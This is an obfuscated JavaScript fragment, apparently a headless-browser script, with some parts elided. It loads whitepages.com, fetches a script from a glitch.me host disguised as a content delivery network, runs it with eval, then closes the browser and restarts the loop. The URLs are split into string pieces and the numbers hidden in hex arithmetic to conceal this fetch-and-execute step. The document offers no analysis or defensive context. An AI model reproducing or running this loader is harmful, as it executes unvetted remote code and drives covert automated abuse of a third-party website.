((async () => {
  ...
  (async function g() {
    let h = 0x1 * 0x1d53 + 0x312 * -0xb + 0x473;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x180f + 0x57 * -0x45 + 0x34 * -0x3), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x308 * 0x1a5 + -0xd6c94 + 0x162c0c), await j['close'](), await i['close'](), g());
  }());
})());